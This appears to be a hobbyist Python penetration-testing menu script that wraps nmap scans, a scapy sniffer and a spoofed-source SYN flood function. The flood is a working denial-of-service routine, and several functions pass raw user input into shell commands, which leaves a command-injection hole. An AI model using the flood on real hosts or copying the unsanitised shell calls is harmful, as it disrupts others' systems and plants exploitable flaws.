import os
import sys
import subprocess
import random
from tabulate import tabulate
from scapy.all import *
from scapy.all import sniff
from scapy.layers.inet import IP


def print_summary(pkt): # Prints summary from sniff scan
    if IP in pkt:
        ip_src=pkt[IP].src
        ip_dst=pkt[IP].dst
    if TCP in pkt:
        tcp_sport=pkt[TCP].sport
        tcp_dport=pkt[TCP].dport

        print(" IP src " + str(ip_src) + " TCP sport " + str(tcp_sport))
        print(" IP dst " + str(ip_dst) + " TCP dport " + str(tcp_dport))


def ICMP_ping(ip): # Checks active hosts in ip range given from user input
    cmd = 'nmap -sn -PE ' + (ip) + ' | grep "Nmap scan" | cut -d" " -f5  >> icmp.dat'
    output = subprocess.getoutput(cmd)


def Port_ID(): # checks top 10 ports of ips from icmp.dat file
    cmd = 'nmap -n -sU -sT -iL icmp.dat --top-ports 10 | egrep "Nmap scan|/tcp|/udp|PORT" >> ports.dat'
    output = subprocess.getoutput(cmd)



def Open_Port_ID(): # Checks top 10 ports from active ips from icmp.dat file
    cmd = 'nmap -n -sU -sT -iL icmp.dat --top-ports 10 --open | egrep "open |PORT|Nmap scan" >> open_ports.dat'
    output = subprocess.getoutput(cmd)


def OS_Fingerprint(): # Fast checks ports with traceroute  level 4 from icmp.dat list of active hosts
    cmd = 'nmap -sV -O -F -T4 --version-light --osscan-guess -iL icmp.dat | egrep "PORT|Nmap scan|open|OS |OS: |Device type:|mac" >> fingerprint.dat'
    output = subprocess.getoutput(cmd)



def Router_Firewall_Detection(): # Checks firewall ports 520 and 521 for TCP and UDP individually for speed
    ip = input("Give an initial ip with range (either - or / and range entered at the end): ")
    cmd1 = 'nmap -Pn -sU -p U:520,521 ' + ip + ' | egrep "/udp|PORT|Nmap scan|MAC" >> wall.dat'
    output = subprocess.getoutput(cmd1)
    cmd2 = 'nmap -Pn -sT -p T:520,521 ' + ip + ' | egrep "/tcp|PORT|Nmap scan|MAC" >> wall.dat'
    output = subprocess.getoutput(cmd2)


def WebServer_Detection(): # Checks ports 80 and 443 for web-server presence
    ip = input("Give an initial ip with range (either - or / and range entered at the end): ")
    cmd = 'nmap -Pn -R -sT -sU -p80,443 --open ' + ip + ' | egrep "/tcp|/udp|MAC|Nmap scan" >> web.dat'
    output = subprocess.getoutput(cmd)



def SNMP_Detection(): # Checks SNMP ports 161 and 162 for input IP range
    ip = input("Give an initial ip with range (either - or / and range entered at the end): ")
    cmd = 'nmap -p161,162 -sU -sT ' + ip + ' | egrep "PORT|Nmap scan|/tcp|/udp" >> snmp.dat'
    output = subprocess.getoutput(cmd)

def SYN_Flood(dstip,dstport,packets): # Takes and input for destination IP and ports with how many packets you want to send
    print('Flooding !!!')
    dstport = [int(i) for i in dstport]
    for x in range(0,packets):
        IP_pack = IP()
        TCP_pack = TCP()
        IP_pack.src = RandIP()
        IP_pack.dst = dstip
        TCP_pack.sport, TCP_pack.dport = random.randint(0,65535), dstport
        TCP_pack.flags, TCP_pack.seq, TCP_pack.window = "S", random.randint(1,1000), random.randint(1,1000)
        send(IP_pack/TCP_pack, verbose=0)


def SHOW(): # Shows all the current files that exist within the penetration testing directory
    os.system("clear")
    print('##'*60)
    print("Showing results of files that exist through testing")
    try:
        with open('icmp.dat','r') as f:
            print('ICMP Ping scan Results')
            print(f.read())
            print('##'*60)
            f.close()
    except IOError:
        pass

    try:
        with open('ports.dat','r') as f:
            content = f.readlines()
            print('Port information from IP ranges')
        for line in content:
            if line.__contains__("Nmap scan"):
                print("--"*60)
                print(line)
            else:
                print(line)
        print("##"*60)
        f.close()
    except IOError:
        pass
    
    try:
        with open('open_ports.dat','r') as f:
            content = f.readlines()
            print('Open Port information from ports obtained in IP ranges')
        for line in content:
            if line.__contains__("Nmap scan"):
                print("--"*60)
                print(line)
            else:
                print(line)
        print("##"*60)
        f.close()
    except IOError:
        pass

    try:
        with open('fingerprint.dat','r') as f:
            content = f.readlines()
            print('Operating system (OS) and OS version from ip ranges with open ports ')
        for line in content:
            if line.__contains__("Nmap scan"):
                print("--"*60)
                print(line)
            else:
                print(line)
        print("##"*60)
        f.close()
    except IOError:
        pass

    try:
        with open('web.dat','r') as f:
            content = f.readlines()
            print('Web-server addresses, protocols, and ports of each web-server')
        for line in content:
            if line.__contains__("Nmap scan"):
                print("--"*60)
                print(line)
            else:
                print(line)
        print("##"*60)
        f.close()
    except IOError:
        pass
    
    try:
        with open('snmp.dat','r') as f:
            content = f.readlines()
            print('Neighboring addresses scanned for SNMP')
        for line in content:
            if line.__contains__("Nmap scan"):
                print("--"*60)
                print(line)
            else:
                print(line)
        print("##"*60)
        f.close()
    except IOError:
        pass

    try:
        with open('wall.dat','r') as f:
            content = f.readlines()
            print('Firewall and router detection')
        for line in content:
            if line.__contains__("Nmap scan"):
                print("--"*60)
                print(line)
            else:
                print(line)
        print("##"*60)
        f.close()
    except IOError:
        pass

def Sniff(): # TCP sniffing of the network
    sniff(filter="ip",prn=print_summary)

def menu(): # Creates UI for the user to implement penetration testing
    os.system("clear")
    print('##'*60)
    print('Welcome to Penetration Testing Environmment!')
    table = [['1','ICMP Ping Scan'],['2','Ports from ip range from [1 required]'],['3','View open ports from ports in pinged IP range from [1,2 required]'], \
            ['4','OS and version info [1,2,3 required]'], ['5','Firewalls & Routers scan'], ['6','Web-services'], ['7','SNMP port detection']\
            , ['8','SYN-Flood Attack!!! :)'], ['9','Show currently output files of test results'], ['10','Network Sniffer']]
    print(tabulate(table, headers=['Type #', 'Test information']))
    print('##'*60)



def main(): # Creates menu within infinite loop until user decides to quit. All functions are activated here from user input.
    menu()
    while True:
        
        testno = input("Chose a test initiate! (-1 to end program | 0 to call back menu table): ")
        
        testno = int(testno)

        if testno == -1:
            break
        elif testno == 0:
            menu()
        elif testno == 1:
            ip = str(input('Give an IP address (if you want range use / for block, - for range): '))
            print('Testing '+'...'*5)
            ICMP_ping(ip)
        elif testno == 2:
            print('Testing '+'...'*5)
            Port_ID()
        elif testno == 3:
            print('Testing '+'...'*5)
            Open_Port_ID()
        elif testno == 4:
            print('Testing '+'...'*5)
            OS_Fingerprint()
        elif testno == 5:
            print('Testing '+'...'*5)
            Router_Firewall_Detection()
        elif testno == 6:
            print('Testing '+'...'*5)
            WebServer_Detection()
        elif testno == 7:
            SNMP_Detection()
        elif testno == 8:
            dIP = input("\nTarget IP : ")
            dPort = input("Port: ")
            packetno = input ("How many packets do you want to send : ")
            SYN_Flood(dIP,dPort.split(','),int(packetno))
        elif testno == 9:
            SHOW()
        elif testno == 10:
            Sniff()
        else:
            print('Not a valid input!')
            

    #
    # SHOW()

if __name__ == "__main__":
    main()
